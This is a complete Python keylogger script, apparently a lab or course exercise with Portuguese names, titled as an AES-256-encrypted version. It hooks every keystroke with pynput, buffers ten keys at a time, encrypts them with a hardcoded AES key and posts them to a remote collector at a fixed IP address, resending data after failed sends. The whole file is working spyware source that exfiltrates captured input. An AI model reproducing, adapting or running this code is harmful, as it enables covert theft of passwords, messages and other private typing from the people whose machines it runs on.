#!/usr/bin/env python3

from pynput import keyboard
import requests
import time
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import base64
import os

SERVIDOR_URL = "http://192.168.2.154:5000/logs"
MAX_TECLAS = 10
CHAVE_AES = b'ChaveSecreta1234567890123456789012'[:32]


class KeyloggerCriptografado:
    def __init__(self, url_servidor, chave_aes, max_teclas=10):
        self.url_servidor = url_servidor
        self.chave_aes = chave_aes
        self.max_teclas = max_teclas
        self.teclas_capturadas = []
        self.lock = threading.Lock()

    def criptografar_aes(self, texto):
        iv = os.urandom(16)
        cipher = Cipher(
            algorithms.AES(self.chave_aes),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()
        texto_bytes = texto.encode('utf-8')
        texto_padded = padder.update(texto_bytes) + padder.finalize()
        texto_criptografado = encryptor.update(texto_padded) + encryptor.finalize()
        resultado = base64.b64encode(iv + texto_criptografado).decode('utf-8')
        return resultado

    def processar_tecla(self, tecla):
        try:
            caractere = tecla.char
        except AttributeError:
            if tecla == keyboard.Key.space:
                caractere = ' '
            elif tecla == keyboard.Key.enter:
                caractere = '\n'
            elif tecla == keyboard.Key.tab:
                caractere = '\t'
            elif tecla == keyboard.Key.backspace:
                caractere = '[BACKSPACE]'
            else:
                caractere = f'[{tecla.name.upper()}]'

        with self.lock:
            self.teclas_capturadas.append(caractere)
            print(f"Tecla capturada: {caractere}")

            if len(self.teclas_capturadas) >= self.max_teclas:
                self.enviar_dados()

    def enviar_dados(self):
        if not self.teclas_capturadas:
            return

        dados_texto = ''.join(self.teclas_capturadas)
        self.teclas_capturadas = []

        try:
            dados_criptografados = self.criptografar_aes(dados_texto)
            print(f"\n[*] Enviando dados CRIPTOGRAFADOS para {self.url_servidor}...")
            print(f"[*] Texto original: {dados_texto}")
            print(f"[*] Dados criptografados: {dados_criptografados[:50]}...")

            resposta = requests.post(
                self.url_servidor,
                json={
                    'dados': dados_criptografados,
                    'timestamp': time.time(),
                    'criptografado': True
                },
                timeout=5
            )

            if resposta.status_code == 200:
                print(f"[✓] Dados enviados com sucesso!")
            else:
                print(f"[!] Erro ao enviar: Status {resposta.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Erro de conexão: {e}")
            with self.lock:
                self.teclas_capturadas.insert(0, dados_texto)
        except Exception as e:
            print(f"[!] Erro ao criptografar/enviar: {e}")

    def ao_pressionar(self, tecla):
        self.processar_tecla(tecla)

    def iniciar(self):
        print("=" * 60)
        print("KEYLOGGER V2 - COM CRIPTOGRAFIA AES-256")
        print("=" * 60)
        print(f"[*] Servidor: {self.url_servidor}")
        print(f"[*] Máximo de teclas antes do envio: {self.max_teclas}")
        print(f"[*] Criptografia: AES-256-CBC")
        print("[*] Iniciando captura de teclas...")
        print("[*] Pressione Ctrl+C para parar")
        print("=" * 60)

        with keyboard.Listener(on_press=self.ao_pressionar) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                print("\n[*] Encerrando keylogger...")
                with self.lock:
                    if self.teclas_capturadas:
                        self.enviar_dados()


if __name__ == "__main__":
    keylogger = KeyloggerCriptografado(
        url_servidor=SERVIDOR_URL,
        chave_aes=CHAVE_AES,
        max_teclas=MAX_TECLAS
    )

    try:
        keylogger.iniciar()
    except KeyboardInterrupt:
        print("\n[*] Programa encerrado pelo usuário.")
